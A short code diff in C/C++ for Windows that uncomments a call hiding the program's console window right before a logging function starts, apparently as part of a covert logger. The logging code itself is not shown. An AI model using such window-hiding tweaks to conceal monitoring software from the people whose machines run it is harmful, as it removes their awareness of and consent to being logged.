@@ -72,6 +72,6 @@ void startLogging(){
 }
 
 int main(){
-   // ShowWindow(GetConsoleWindow(), SW_HIDE);
+   ShowWindow(GetConsoleWindow(), SW_HIDE);
     startLogging();
 }
